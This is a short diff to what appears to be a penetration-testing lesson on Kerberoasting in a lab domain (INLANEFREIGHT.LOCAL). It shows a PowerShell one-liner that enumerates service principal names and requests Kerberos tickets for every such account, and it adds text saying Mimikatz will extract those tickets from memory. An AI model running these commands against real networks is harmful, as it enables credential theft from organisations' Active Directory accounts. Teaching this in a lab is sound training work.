@@ -113,3 +113,10 @@ Before moving on, let's break down the commands above to see what we are doing (
 ```shell
 setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
 ```
+
+The above command combines the previous command with `setspn.exe` to request tickets for all accounts with SPNs set.
+
+Now that the tickets are loaded, we can use `Mimikatz` to extract the ticket(s) from `memory`.
+
+
+### Extracting Tickets from Memory with Mimikatz
